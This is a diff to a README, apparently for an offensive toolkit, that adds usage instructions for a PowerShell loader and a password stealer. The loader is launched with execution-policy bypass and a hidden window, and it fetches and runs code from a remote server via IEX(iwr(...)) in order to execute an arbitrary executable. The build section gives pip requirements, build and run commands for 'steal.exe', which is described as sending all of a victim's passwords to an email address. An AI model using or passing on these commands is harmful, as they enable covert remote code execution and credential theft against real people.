@@ -176,6 +176,59 @@ if __name__ == "__main__":
 
 </details>
 
+## Powershell exe loader
+Loads an executable from an url with arguments
+
+<details>
+<summary>Details</summary>
+
+file: [loadexe.ps1](loadexe.ps1)
+
+### usage
+```shell
+powershell -ep ByPass -w h "IEX(iwr('https://vercelutilsserver.totallysafe.ch/exe2ps1?url=https%3A%2F%2Fwww.python.org%2Fftp%2Fpython%2F3.12.4%2Fpython-3.12.4.exe'))"
+```
+(executes python installer gui from [python.org/ftp/python/3.12.4/python-3.12.4.exe](https://www.python.org/ftp/python/3.12.4/python-3.12.4.exe), uses [kaliiiiiiiiii/vercel_utils_server/exe2ps1](https://github.com/kaliiiiiiiiii/vercel_utils_server/blob/main/app/exe2ps1/route.ts)) \
+or
+```shell
+powershell -ep ByPass -w h ./loadexe.ps1
+```
+</details>
+
+# build
+an example for building `.exe` file (sends all passwords to an email)
+
+### Requirements
+```shell
+pip install --upgrade pyinstaller selenium-driverless aiosqlite pywin32 pycryptodome aiofiles aiohttp
+```
+
+### build
+```shell
+python build.py
+```
+
+### run
+```shell
+.\dist\steal.exe test@test.com
+```
+or from python
+```shell
+python steal.py test@test.com
+```
+```shell
+python steal.py -h
+# usage: steal.py [-h] [--headfull] [--cc CC] to
+# 
+# positional arguments:
+#   to          The destination to send the E-Mail to
+# 
+# options:
+#   -h, --help  show this help message and exit
+#   --headfull  open a window for edge
+#   --cc CC
+```
+
 ## Acknowledgments
 Inspiration, code snippets, etc.
 
